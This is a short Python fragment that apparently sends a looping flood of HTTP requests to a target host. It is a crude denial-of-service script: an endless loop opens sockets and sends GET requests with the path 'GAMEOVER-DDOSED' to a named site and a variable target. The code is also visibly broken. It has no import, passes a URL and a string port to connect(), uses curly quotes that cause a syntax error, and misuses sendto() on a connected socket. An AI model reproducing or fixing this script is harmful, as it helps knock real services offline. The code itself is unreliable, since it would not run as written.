while True:
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(("https://elijahr.dev", "80"))
 s.sendto(("GET /GAMEOVER-DDOSED" + target + " HTTP/1.1\r\n").encode(’ascii’), (target, port))
 s.sendto(("Host: its-over.com" + "\r\n\r\n").encode(’ascii’), (target, port))
 s.close()
